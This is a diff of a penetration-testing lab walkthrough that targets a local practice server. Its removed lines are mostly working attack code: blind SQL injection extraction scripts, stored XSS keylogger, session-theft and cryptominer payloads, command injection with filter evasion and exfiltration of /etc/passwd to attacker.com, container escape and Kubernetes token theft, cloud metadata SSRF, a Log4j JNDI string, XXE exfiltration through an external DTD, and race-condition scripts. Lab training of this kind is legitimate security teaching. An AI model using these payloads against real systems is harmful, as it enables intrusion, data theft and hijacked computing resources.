@@ -1,1611 +1,1363 @@
 # Zeroday Academy - Intermediate Labs Walkthrough
 
-**Advanced exploitation techniques for experienced penetration testers**
+**Advanced exploitation techniques with bypass methods for experienced penetration testers**
 
 ---
 
 ## Table of Contents
 
-1. [Blind SQL Injection (Advanced)](#1-blind-sql-injection-advanced)
-2. [Stored XSS with Filter Bypass](#2-stored-xss-with-filter-bypass)
-3. [Advanced Authentication Bypass](#3-advanced-authentication-bypass)
-4. [Command Injection with Filter Evasion](#4-command-injection-with-filter-evasion)
-5. [Advanced Data Exposure Techniques](#5-advanced-data-exposure-techniques)
-6. [XXE with Out-of-Band Exploitation](#6-xxe-with-out-of-band-exploitation)
-7. [Complex Access Control Bypass](#7-complex-access-control-bypass)
-8. [Advanced Security Misconfiguration](#8-advanced-security-misconfiguration)
-9. [Advanced Deserialization Attacks](#9-advanced-deserialization-attacks)
+1. [Server-Side Template Injection (SSTI)](#1-server-side-template-injection-ssti)
+2. [LDAP Injection](#2-ldap-injection)
+3. [NoSQL Injection](#3-nosql-injection)
+4. [JWT Manipulation](#4-jwt-manipulation)
+5. [Advanced CSRF](#5-advanced-csrf)
+6. [GraphQL Injection](#6-graphql-injection)
+7. [WebSocket Manipulation](#7-websocket-manipulation)
+8. [Race Condition](#8-race-condition)
+9. [HTTP Host Header Injection](#9-http-host-header-injection)
 
 ---
 
-## 1. Blind SQL Injection (Advanced)
+## 1. Server-Side Template Injection (SSTI)
 
 ### Vulnerability Description
-Advanced blind SQL injection techniques including boolean-based, time-based, and error-based extraction methods. This lab simulates real-world scenarios where direct output is not available.
+Server-Side Template Injection occurs when user input is embedded into template engines without proper sanitization, allowing attackers to execute arbitrary code on the server.
+
+### Lab URL
+`http://localhost:5000/api/vuln/ssti`
 
 ### Impact
-- Complete database enumeration without visible output
-- Automated data extraction through scripted attacks
-- Bypassing advanced filtering mechanisms
-- Privilege escalation through stored procedures
-
-### Advanced Solution Steps
-
-#### Step 1: Boolean-Based Blind SQL Injection
-**Objective:** Extract data using conditional true/false responses
-
-**Using curl with automated character extraction:**
-```bash
-#!/bin/bash
-# Script to extract admin password character by character
-password=""
-for i in {1..20}; do
-  for ascii in {32..126}; do
-    response=$(curl -s "http://localhost:5000/api/vuln/sqli-advanced?id=1' AND ASCII(SUBSTR((SELECT password FROM users WHERE role='admin'),$i,1))=$ascii--")
-    if [[ $response == *"TRUE"* ]]; then
-      char=$(printf "\\$(printf '%03o' $ascii)")
-      password+=$char
-      echo "Character $i: $char (Password so far: $password)"
-      break
-    fi
-  done
-done
-```
-
-**Using Burp Suite with Intruder:**
-1. Send request to Intruder
-2. Set payload position: `1' AND ASCII(SUBSTR((SELECT password FROM users WHERE role='admin'),§1§,1))>§65§--`
-3. Configure two payload sets:
-   - Position 1: Numbers 1-50 (character position)
-   - Position 2: Numbers 32-126 (ASCII values)
-4. Set attack type to "Cluster Bomb"
-5. Use grep matching to identify successful extractions
-
-#### Step 2: Time-Based Blind SQL Injection
-**Objective:** Use time delays for data extraction
-
-**Using curl with timing analysis:**
-```bash
-#!/bin/bash
-# Time-based extraction with automated timing
-for i in {1..20}; do
-  for ascii in {32..126}; do
-    start_time=$(date +%s.%N)
-    curl -s "http://localhost:5000/api/vuln/sqli-advanced?username=admin'; IF(ASCII(SUBSTR((SELECT password FROM users WHERE role='admin'),$i,1))=$ascii,SLEEP(3),SLEEP(0))--"
-    end_time=$(date +%s.%N)
-    duration=$(echo "$end_time - $start_time" | bc)
-    
-    if (( $(echo "$duration > 2.5" | bc -l) )); then
-      char=$(printf "\\$(printf '%03o' $ascii)")
-      echo "Character $i: $char"
-      break
-    fi
-  done
-done
-```
-
-**Using Burp Suite with response timing:**
-1. Send to Intruder with payload: `admin'; IF(ASCII(SUBSTR((SELECT password FROM users WHERE role='admin'),§1§,1))=§65§,SLEEP(5),SLEEP(0))--`
-2. Configure Cluster Bomb attack with position and ASCII values
-3. Sort results by "Response received" timing
-4. Identify responses with 5+ second delays
-
-#### Step 3: Error-Based SQL Injection
-**Objective:** Extract data through SQL error messages
-
-**Using curl with error extraction:**
-```bash
-curl "http://localhost:5000/api/vuln/sqli-advanced?payload=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e))--"
-curl "http://localhost:5000/api/vuln/sqli-advanced?payload=1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e),1)--"
-```
-
-**Advanced error-based techniques:**
-```bash
-# Double query error injection
-curl "http://localhost:5000/api/vuln/sqli-advanced?payload=1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT CONCAT(0x7e,password,0x7e) FROM users)x GROUP BY x HAVING COUNT(*)>1)--"
-
-# BIGINT overflow error injection
-curl "http://localhost:5000/api/vuln/sqli-advanced?payload=1' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e,password,0x7e) FROM users LIMIT 1)x))--"
-```
-
-### Advanced Prevention Measures
-1. Implement query result randomization
-2. Use database query firewalls
-3. Implement sophisticated input validation with context-aware filtering
-4. Use database activity monitoring (DAM)
-5. Implement query execution time limits
-
----
-
-## 2. Stored XSS with Filter Bypass
-
-### Vulnerability Description
-Advanced cross-site scripting attacks that persist in the application database and employ sophisticated filter evasion techniques.
-
-### Impact
-- Persistent payload execution for all users
-- Advanced social engineering attacks
-- Cryptocurrency mining injection
-- Advanced phishing campaigns
-
-### Advanced Solution Steps
-
-#### Step 1: Identify Storage Mechanisms
-**Objective:** Find where user input gets permanently stored
-
-**Using curl to test comment storage:**
-```bash
-curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
-  -H "Content-Type: application/json" \
-  -d '{"comment":"<script>alert(1)</script>","name":"tester"}'
-```
-
-**Using Burp Suite:**
-1. Intercept POST requests to comment/profile endpoints
-2. Modify JSON/form data with test payloads
-3. Use Repeater to test various input fields
-4. Check if payloads persist across page reloads
-
-#### Step 2: Advanced Filter Bypass Techniques
-**Objective:** Evade sophisticated XSS filters and WAFs
-
-**Using curl with advanced payloads:**
-```bash
-# WAF bypass techniques
-curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
-  -d 'comment=<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">'
-
-# Filter bypass with encoding
-curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
-  -d 'comment=<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>'
-
-# DOM clobbering
-curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
-  -d 'comment=<form id=test><input name=action><input name=method></form><script>test.action="javascript:alert(1)"</script>'
-```
-
-**Advanced Burp Suite techniques:**
-1. Use Burp's "Hackvertor" extension for encoding bypasses
-2. Configure custom payload processors in Intruder
-3. Use Collaborator for out-of-band XSS detection
-
-#### Step 3: Advanced Payload Development
-**Objective:** Create sophisticated attack payloads
-
-**Using curl with advanced payloads:**
-```bash
-# Keylogger injection
-curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
-  -d 'comment=<script>document.addEventListener("keydown",function(e){fetch("http://attacker.com/log?key="+e.key)})</script>'
-
-# Cryptocurrency miner injection
-curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
-  -d 'comment=<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner=new CoinHive.Anonymous("YOUR_SITE_KEY");miner.start();</script>'
-
-# Advanced session hijacking
-curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
-  -d 'comment=<script>fetch("/admin/users",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("http://attacker.com/exfil?data="+btoa(d)))</script>'
-```
-
-### Advanced Prevention Measures
-1. Implement context-aware output encoding
-2. Use Content Security Policy (CSP) with nonces and strict-dynamic
-3. Implement DOM-based XSS protection
-4. Use input validation with machine learning-based detection
-5. Implement real-time XSS attack monitoring
-
----
-
-## 3. Advanced Authentication Bypass
-
-### Vulnerability Description
-Complex authentication bypass techniques including JWT manipulation, session fixation, and race condition exploitation.
-
-### Impact
-- Complete authentication system compromise
-- Privilege escalation through token manipulation
-- Race condition exploitation for temporary access
-- Advanced session hijacking techniques
-
-### Advanced Solution Steps
-
-#### Step 1: JWT Token Manipulation
-**Objective:** Exploit JSON Web Token vulnerabilities
-
-**Using curl for JWT attacks:**
-```bash
-# None algorithm attack
-curl -X POST "http://localhost:5000/api/vuln/auth-advanced" \
-  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9."
-
-# Algorithm confusion attack (RS256 to HS256)
-curl -X POST "http://localhost:5000/api/vuln/auth-advanced" \
-  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.SIGNATURE_USING_PUBLIC_KEY_AS_HMAC_SECRET"
-
-# Weak secret brute force
-curl -X POST "http://localhost:5000/api/vuln/auth-advanced" \
-  -H "Authorization: Bearer $(echo -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9' | openssl dgst -sha256 -hmac 'secret' -binary | base64 | tr -d '\n')"
-```
-
-**Using Burp Suite JWT Editor:**
-1. Install JWT Editor extension
-2. Intercept authentication requests
-3. Modify JWT claims in the extension
-4. Test algorithm confusion attacks
-5. Brute force weak signing secrets
-
-#### Step 2: Session Race Condition Exploitation
-**Objective:** Exploit timing vulnerabilities in authentication
-
-**Using curl with parallel requests:**
-```bash
-#!/bin/bash
-# Race condition attack on session validation
-for i in {1..100}; do
-  curl -X POST "http://localhost:5000/api/vuln/auth-advanced" \
-    -d "username=admin&password=wrong&exploit=race" &
-done
-wait
-```
-
-**Advanced race condition with Burp Suite:**
-1. Send authentication request to Intruder
-2. Set attack type to "Null payloads"
-3. Configure high thread count (50-100)
-4. Use "Resource Pool" to control timing
-5. Analyze responses for timing-based vulnerabilities
-
-#### Step 3: Advanced Session Manipulation
-**Objective:** Exploit session management vulnerabilities
-
-**Using curl for session attacks:**
-```bash
-# Session fixation
-curl -c cookies.txt "http://localhost:5000/api/vuln/auth-advanced?JSESSIONID=ATTACKER_CONTROLLED_SESSION"
-curl -b cookies.txt -X POST "http://localhost:5000/api/vuln/auth-advanced" \
-  -d "username=victim&password=password"
-
-# Session prediction
-for i in {1000..1100}; do
-  curl -b "sessionid=$i" "http://localhost:5000/api/vuln/auth-advanced/profile"
-done
-```
-
-### Advanced Prevention Measures
-1. Implement secure JWT handling with proper algorithm validation
-2. Use cryptographically secure session identifiers
-3. Implement proper session timeout and invalidation
-4. Use synchronization tokens for critical operations
-5. Implement advanced anomaly detection for authentication patterns
-
----
-
-## 4. Command Injection with Filter Evasion
-
-### Vulnerability Description
-Advanced command injection techniques that bypass input filters, WAFs, and sandboxing mechanisms.
-
-### Impact
-- Complete system compromise through filter evasion
-- Advanced persistent backdoor installation
-- Container escape techniques
-- Advanced data exfiltration methods
-
-### Advanced Solution Steps
-
-#### Step 1: Filter Bypass Techniques
-**Objective:** Evade command injection filters
-
-**Using curl with evasion techniques:**
-```bash
-# Concatenation bypass
-curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
-  -d "ping=127.0.0.1;w'h'o'a'm'i"
-
-# Variable substitution bypass
-curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
-  -d "ping=127.0.0.1;\$0 -c whoami"
-
-# Encoding bypass
-curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
-  -d "ping=127.0.0.1;\$(echo d2hvYW1p | base64 -d)"
-
-# Wildcard bypass
-curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
-  -d "ping=127.0.0.1;/bin/c?t /etc/p?sswd"
-```
-
-#### Step 2: Advanced Data Exfiltration
-**Objective:** Extract sensitive data through various channels
-
-**Using curl for DNS exfiltration:**
-```bash
-# DNS exfiltration
-curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
-  -d "ping=127.0.0.1;nslookup \$(whoami).attacker.com"
-
-# HTTP exfiltration with base64
-curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
-  -d "ping=127.0.0.1;curl -X POST http://attacker.com/exfil -d \"\$(cat /etc/passwd | base64 -w 0)\""
-
-# ICMP exfiltration
-curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
-  -d "ping=127.0.0.1;ping -c 1 -p \$(echo \$(whoami) | xxd -p) attacker.com"
-```
-
-#### Step 3: Container Escape Techniques
-**Objective:** Escape containerized environments
-
-**Using curl for container escape:**
-```bash
-# Docker socket abuse
-curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
-  -d "ping=127.0.0.1;docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host"
-
-# Privileged container escape
-curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
-  -d "ping=127.0.0.1;echo 'evil_command' > /host_mount/tmp/backdoor.sh"
-
-# Kubernetes service account abuse
-curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
-  -d "ping=127.0.0.1;kubectl --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get pods --all-namespaces"
-```
-
-### Advanced Prevention Measures
-1. Implement application sandboxing with seccomp-bpf
-2. Use container security frameworks like Falco
-3. Implement runtime application self-protection (RASP)
-4. Use advanced input validation with ML-based detection
-5. Implement network micro-segmentation
-
----
-
-## 5. Advanced Data Exposure Techniques
-
-### Vulnerability Description
-Sophisticated techniques for identifying and exploiting data exposure vulnerabilities in complex applications.
-
-### Impact
-- Advanced reconnaissance and information gathering
-- Configuration file extraction from distributed systems
-- Cloud metadata service exploitation
-- Advanced log file analysis and data mining
-
-### Advanced Solution Steps
-
-#### Step 1: Cloud Metadata Exploitation
-**Objective:** Extract cloud service credentials and configuration
-
-**Using curl for cloud metadata attacks:**
-```bash
-# AWS metadata service
-curl "http://localhost:5000/api/vuln/data-exposure-advanced?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-
-# Azure metadata service
-curl "http://localhost:5000/api/vuln/data-exposure-advanced?url=http://169.254.169.254/metadata/instance/compute?api-version=2019-06-01" \
-  -H "Metadata: true"
-
-# Google Cloud metadata
-curl "http://localhost:5000/api/vuln/data-exposure-advanced?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
-  -H "Metadata-Flavor: Google"
-```
-
-#### Step 2: Advanced Configuration Discovery
-**Objective:** Discover sensitive configuration files in distributed systems
-
-**Using curl for distributed system reconnaissance:**
-```bash
-# Kubernetes API server discovery
-curl "http://localhost:5000/api/vuln/data-exposure-advanced?path=/.well-known/openid_configuration"
-
-# Docker registry API
-curl "http://localhost:5000/api/vuln/data-exposure-advanced?path=/v2/_catalog"
-
-# Elasticsearch cluster info
-curl "http://localhost:5000/api/vuln/data-exposure-advanced?path=/_cluster/health"
-
-# Consul KV store
-curl "http://localhost:5000/api/vuln/data-exposure-advanced?path=/v1/kv/?recurse"
-```
-
-#### Step 3: Advanced Log Analysis and Data Mining
-**Objective:** Extract sensitive information from application logs
-
-**Using curl for log exploitation:**
-```bash
-# Log4j exploitation
-curl "http://localhost:5000/api/vuln/data-exposure-advanced" \
-  -H "User-Agent: \${jndi:ldap://attacker.com/a}"
-
-# Log injection for data extraction
-curl "http://localhost:5000/api/vuln/data-exposure-advanced?search=admin' UNION SELECT password FROM users--"
-
-# Debug log exposure
-curl "http://localhost:5000/api/vuln/data-exposure-advanced?debug=true&level=ALL"
-```
-
-### Advanced Prevention Measures
-1. Implement sophisticated access control for metadata services
-2. Use secrets management systems like HashiCorp Vault
-3. Implement log sanitization and sensitive data detection
-4. Use distributed configuration management with encryption
-5. Implement advanced monitoring for unusual data access patterns
-
----
-
-## 6. XXE with Out-of-Band Exploitation
-
-### Vulnerability Description
-Advanced XML External Entity attacks using out-of-band techniques for data exfiltration when direct output is not available.
-
-### Impact
-- Advanced data exfiltration through DNS/HTTP channels
-- Internal network reconnaissance through blind XXE
-- Advanced file system enumeration
-- Cloud service exploitation through XXE
-
-### Advanced Solution Steps
-
-#### Step 1: Out-of-Band XXE Setup
-**Objective:** Establish external communication channel for data exfiltration
-
-**Setting up attack infrastructure:**
-```bash
-# Setup HTTP server for data collection
-python3 -m http.server 8080 &
-
-# Setup DNS server for DNS exfiltration (requires dnslib)
-python3 -c "
-import socketserver
-from dnslib import *
-
-class DNSHandler(socketserver.BaseRequestHandler):
-    def handle(self):
-        data = self.request[0]
-        query = DNSRecord.parse(data)
-        print(f'DNS Query: {query.q.qname}')
-
-server = socketserver.UDPServer(('0.0.0.0', 53), DNSHandler)
-server.serve_forever()
-" &
-```
-
-#### Step 2: Advanced XXE Exploitation
-**Objective:** Extract data using parameter entities and external DTDs
-
-**Using curl with external DTD:**
-```bash
-# Create evil.dtd on your server
-cat > evil.dtd << 'EOF'
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR_IP:8080/exfil?data=%file;'>">
-%eval;
-%exfiltrate;
-EOF
-
-# Execute XXE attack
-curl -X POST "http://localhost:5000/api/vuln/xxe-advanced" \
-  -H "Content-Type: application/xml" \
-  -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://YOUR_IP:8080/evil.dtd\"> %xxe;]><root></root>"
-```
-
-#### Step 3: Advanced Network Reconnaissance
-**Objective:** Use XXE for internal network scanning
-
-**Using curl for network scanning:**
-```bash
-# Port scanning through XXE
-for port in 22 80 443 3306 5432; do
-  curl -X POST "http://localhost:5000/api/vuln/xxe-advanced" \
-    -H "Content-Type: application/xml" \
-    -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://192.168.1.1:$port\">]><root>&xxe;</root>"
-done
-
-# Service enumeration
-curl -X POST "http://localhost:5000/api/vuln/xxe-advanced" \
-  -H "Content-Type: application/xml" \
-  -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://localhost:6379/\">]><root>&xxe;</root>"
-```
-
-### Advanced Prevention Measures
-1. Implement XML parsing with secure configurations by default
-2. Use XML schema validation with strict whitelisting
-3. Implement network-level protections against XXE
-4. Use application-level firewalls with XML inspection
-5. Implement advanced monitoring for XXE attack patterns
-
----
-
-## 7. Complex Access Control Bypass
-
-### Vulnerability Description
-Advanced access control bypass techniques including IDOR chaining, privilege escalation through parameter pollution, and multi-step authorization bypass.
-
-### Advanced Solution Steps
-
-#### Step 1: IDOR Chain Exploitation
-**Objective:** Chain multiple IDOR vulnerabilities for privilege escalation
-
-**Using curl for IDOR chaining:**
-```bash
-# Step 1: Enumerate user IDs
-for id in {1..100}; do
-  response=$(curl -s "http://localhost:5000/api/vuln/access-control-advanced?user_id=$id")
-  if [[ $response == *"admin"* ]]; then
-    echo "Admin user found: ID $id"
-    admin_id=$id
-    break
-  fi
-done
-
-# Step 2: Use discovered admin ID to access sensitive functions
-curl "http://localhost:5000/api/vuln/access-control-advanced/admin?user_id=$admin_id&action=create_user"
-```
-
-### Advanced Prevention Measures
-1. Implement sophisticated authorization matrices
-2. Use attribute-based access control (ABAC)
-3. Implement real-time access pattern analysis
-4. Use zero-trust architecture principles
-5. Implement advanced session management with context awareness
-
----
-
-## 7. WebSocket Message Manipulation Lab
-
-### Vulnerability Description
-This lab demonstrates real-time WebSocket communication vulnerabilities where attackers can intercept, modify, and inject malicious messages to escalate privileges or execute unauthorized commands.
-
-### Impact
-- Real-time privilege escalation through message tampering
-- Command injection via WebSocket payloads
-- Session hijacking through WebSocket token manipulation
-- Bypass of client-side security controls
-
-### Advanced Solution Steps
-
-#### Step 1: Establish WebSocket Connection and Intercept Traffic
-**Objective:** Connect to the WebSocket server and observe message flow
-
-**Using Browser DevTools:**
-1. Open the WebSocket Manipulation Lab
-2. Open Browser DevTools (F12) → Network tab → WS filter
-3. Click "Connect to Chat Server"
-4. Observe the WebSocket connection at `ws://localhost:5000`
-5. Send a test message and watch the real-time communication
-
-**Using Burp Suite for WebSocket Interception:**
-1. Configure browser to proxy through Burp (127.0.0.1:8080)
-2. In Burp, go to Proxy → Options → WebSocket interception
-3. Enable "Intercept WebSocket messages"
-4. Connect to the lab's WebSocket server
-5. In Burp's WebSocket history, you'll see all messages
-
-**Expected Response:** 
-```json
-{"type":"message","content":"Hello","user":"guest","timestamp":"..."}
-```
-
-#### Step 2: Analyze Message Structure
-**Objective:** Understand the WebSocket message format to identify injection points
-
-**Message Structure Analysis:**
-```json
-{
-  "type": "message",           // Message type: message, status, command
-  "content": "Hello World",    // User input (injectable)
-  "user": "guest",             // User role (tamperable)
-  "timestamp": "2025-10-02T..."
-}
-```
-
-**Burp Suite Analysis:**
-1. In WebSocket history, right-click on a message
-2. Select "Send to Repeater"
-3. In Repeater, modify the JSON payload
-4. Click "Send" to test modified messages
-
-#### Step 3: Privilege Escalation via Role Manipulation
-**Objective:** Escalate from guest to admin by modifying the user role
-
-**Using Browser Console:**
-```javascript
-// Intercept and modify WebSocket send function
-const originalSend = WebSocket.prototype.send;
-WebSocket.prototype.send = function(data) {
-  const message = JSON.parse(data);
-  message.user = "admin";  // Change role to admin
-  console.log("Modified message:", message);
-  originalSend.call(this, JSON.stringify(message));
-};
-
-// Send message with admin privileges
-ws.send(JSON.stringify({
-  type: "message",
-  content: "Admin message",
-  user: "admin",
-  timestamp: new Date().toISOString()
-}));
-```
-
-**Using Burp Suite Repeater:**
-1. Capture a normal message in WebSocket history
-2. Send to Repeater
-3. Modify the JSON:
-```json
-{
-  "type": "message",
-  "content": "Test admin access",
-  "user": "admin",
-  "timestamp": "2025-10-02T18:30:00Z"
-}
-```
-4. Click "Send" and observe the response
-5. **Flag reward:** `{WEBSOCKET_ADMIN_PRIVILEGE_ESCALATION}`
-
-#### Step 4: Command Injection via WebSocket Messages
-**Objective:** Execute system commands by injecting malicious payloads
-
-**Using Burp Suite for Command Injection:**
-1. In Repeater, modify the message type to "command"
-2. Test various command injection payloads:
-
-```json
-{
-  "type": "command",
-  "content": "getUserList",
-  "user": "admin",
-  "timestamp": "2025-10-02T18:30:00Z"
-}
-```
-
-**Advanced command injection:**
-```json
-{
-  "type": "command",
-  "content": "deleteUser; cat /etc/passwd",
-  "user": "admin",
-  "timestamp": "2025-10-02T18:30:00Z"
-}
-```
-
-3. Send the payload and check the response
-4. **Flag reward:** `{WEBSOCKET_COMMAND_INJECTION}`
-
-#### Step 5: Automated WebSocket Exploitation
-**Objective:** Create an automated script for WebSocket exploitation
-
-**Python Script for Automated Exploitation:**
-```python
-import websocket
-import json
-import time
-
-def on_message(ws, message):
-    print(f"Received: {message}")
-    data = json.loads(message)
-    if "admin" in message.lower():
-        print("[+] Admin privilege escalation successful!")
-
-def on_error(ws, error):
-    print(f"Error: {error}")
-
-def on_open(ws):
-    print("[*] WebSocket connection established")
-    
-    # Send privilege escalation payload
-    exploit_payload = {
-        "type": "message",
-        "content": "Privilege escalation test",
-        "user": "admin",
-        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ")
-    }
-    ws.send(json.dumps(exploit_payload))
-    
-    # Send command injection payload
-    command_payload = {
-        "type": "command",
-        "content": "getUserList",
-        "user": "admin",
-        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ")
-    }
-    ws.send(json.dumps(command_payload))
-
-# Connect to vulnerable WebSocket server
-ws = websocket.WebSocketApp("ws://localhost:5000",
-                          on_message=on_message,
-                          on_error=on_error,
-                          on_open=on_open)
-ws.run_forever()
-```
-
-### Real-World Impact
-- Chat applications with role-based access
-- Real-time trading platforms
-- Collaborative editing tools
-- IoT device control interfaces
-
-### Advanced Prevention Measures
-1. Implement server-side message validation for all WebSocket communications
-2. Use cryptographic signatures to prevent message tampering
-3. Implement role-based access control on the server side
-4. Rate limit WebSocket message frequency
-5. Log and monitor all WebSocket command executions
-6. Use WSS (WebSocket Secure) with proper TLS configuration
-7. Implement WebSocket authentication tokens with short expiration
-
----
-
-## 8. Race Condition Exploitation Lab
-
-### Vulnerability Description
-Race conditions occur when multiple concurrent requests exploit a time window between checking a condition (Time-of-Check) and using the result (Time-of-Use), allowing attackers to bypass security controls or manipulate resources.
-
-### Impact
-- Multiple use of single-use discount codes
-- Concurrent transaction exploitation
-- Balance manipulation in financial systems
-- Resource exhaustion attacks
-- Inventory bypass in e-commerce
-
-### Advanced Solution Steps
-
-#### Step 1: Identify the Race Condition Window
-**Objective:** Locate the vulnerability in the discount code redemption system
-
-**Manual Testing:**
-1. Open the Race Condition Lab
-2. Note the starting balance: $1000
-3. Use the discount code: `DISCOUNT50`
-4. Observe that the code can only be used once normally
-5. **Vulnerable window:** Between checking if code is used and marking it as used
-
-**Time-of-Check to Time-of-Use (TOCTOU) Flow:**
-```
-1. Server receives redemption request
-2. [CHECK] Is the code already used? → NO
-3. [DELAY - VULNERABLE WINDOW] ← Multiple requests can enter here
-4. [USE] Mark code as used and apply discount
-```
-
-#### Step 2: Exploit with Concurrent Requests Using Burp Suite
-**Objective:** Send multiple simultaneous requests to exploit the race condition
-
-**Using Burp Suite Repeater:**
-1. Capture the discount code redemption request
-2. Send to Repeater
-3. In Repeater, create multiple tabs with the same request (Ctrl+R)
-4. Manually click "Send" on all tabs as fast as possible
-5. Observe that multiple requests succeed
-
-**Using Burp Suite Intruder (Better Method):**
-1. Capture the redemption request: 
-```http
-POST /api/vuln/race-condition HTTP/1.1
-Host: localhost:5000
-Content-Type: application/json
-
-{"code":"DISCOUNT50","accountId":"user123"}
-```
-
-2. Send to Intruder (Ctrl+I)
-3. Clear all payload positions (we don't need variables)
-4. Go to Intruder → Options:
-   - Set "Number of threads" to 20-30 (maximum concurrency)
-   - Disable payload encoding
-   - Enable "Make unmodified baseline request"
-5. Go to Intruder → Payloads:
-   - Payload type: "Null payloads"
-   - Generate: 50 payloads (50 concurrent requests)
-6. Click "Start attack"
-7. **Result:** Multiple requests succeed before the code is marked as used
-
-**Expected Response (Multiple successes):**
-```json
-{
-  "success": true,
-  "message": "Discount applied successfully!",
-  "newBalance": 1050
-}
-```
-
-#### Step 3: Advanced Exploitation with Python Script
-**Objective:** Automate the race condition exploitation with precise timing
-
-**Python Script for Maximum Concurrency:**
-```python
-import requests
-import concurrent.futures
-import time
-
-url = "http://localhost:5000/api/vuln/race-condition"
-payload = {
-    "code": "DISCOUNT50",
-    "accountId": "user123"
-}
-
-def send_request(session, request_id):
-    try:
-        response = session.post(url, json=payload)
-        result = response.json()
-        if result.get("success"):
-            print(f"[+] Request {request_id}: SUCCESS - Balance: {result.get('newBalance')}")
-            return True
-        else:
-            print(f"[-] Request {request_id}: FAILED - {result.get('message')}")
-            return False
-    except Exception as e:
-        print(f"[!] Request {request_id}: ERROR - {e}")
-        return False
-
-def exploit_race_condition(num_requests=50):
-    print(f"[*] Launching {num_requests} concurrent requests...")
-    
-    session = requests.Session()
-    successful_requests = 0
-    
-    # Use ThreadPoolExecutor for maximum concurrency
-    with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
-        # Submit all requests at once
-        futures = [executor.submit(send_request, session, i) for i in range(num_requests)]
-        
-        # Wait for all requests to complete
-        for future in concurrent.futures.as_completed(futures):
-            if future.result():
-                successful_requests += 1
-    
-    print(f"\n[*] Exploitation complete!")
-    print(f"[+] Successful redemptions: {successful_requests}/{num_requests}")
-    print(f"[+] Expected balance increase: ${successful_requests * 50}")
-
-if __name__ == "__main__":
-    exploit_race_condition(50)
-```
-
-**Expected Output:**
-```
-[*] Launching 50 concurrent requests...
-[+] Request 1: SUCCESS - Balance: 1050
-[+] Request 2: SUCCESS - Balance: 1100
-[+] Request 3: SUCCESS - Balance: 1150
-...
-[+] Request 15: SUCCESS - Balance: 1750
-[-] Request 16: FAILED - Code already used
-...
-[*] Exploitation complete!
-[+] Successful redemptions: 15/50
-[+] Expected balance increase: $750
-```
-
-#### Step 4: Balance Manipulation Verification
-**Objective:** Verify the exploitation by checking the final balance
-
-1. Check the final balance in the lab interface
-2. Verify that you've applied the discount multiple times
-3. **Flag reward:** `{RACE_CONDITION_EXPLOITED_MULTIPLE_USES}`
-
-**Burp Suite Verification:**
-```http
-GET /api/vuln/race-condition/balance?accountId=user123 HTTP/1.1
-Host: localhost:5000
-```
-
-**Expected Response:**
-```json
-{
-  "balance": 1750,
-  "appliedDiscounts": 15,
-  "message": "Race condition successfully exploited"
-}
-```
-
-#### Step 5: Advanced Race Condition Techniques
-
-**Distributed Race Condition Attack:**
-```python
-# Use multiple IP addresses or machines for harder detection
-import requests
-from requests.adapters import HTTPAdapter
-from requests.packages.urllib3.util.retry import Retry
-
-def create_session_with_retry():
-    session = requests.Session()
-    retry = Retry(total=5, backoff_factor=0.1)
-    adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
-    session.mount('http://', adapter)
-    return session
-```
-
-**Timing Analysis:**
-```python
-import time
-
-def measure_vulnerability_window():
-    times = []
-    for i in range(10):
-        start = time.time()
-        response = requests.post(url, json=payload)
-        end = time.time()
-        times.append(end - start)
-    
-    avg_time = sum(times) / len(times)
-    print(f"[*] Average response time: {avg_time:.4f}s")
-    print(f"[*] Vulnerable window estimate: {avg_time * 1000:.2f}ms")
-```
-
-### Real-World Scenarios
-- E-commerce promotional code exploitation
-- Banking transaction manipulation
-- Cryptocurrency double-spending
-- Limited inventory item purchases
-- Vote manipulation in voting systems
-
-### Advanced Prevention Measures
-1. Implement distributed locking mechanisms (Redis, etcd)
-2. Use database transactions with proper isolation levels (SERIALIZABLE)
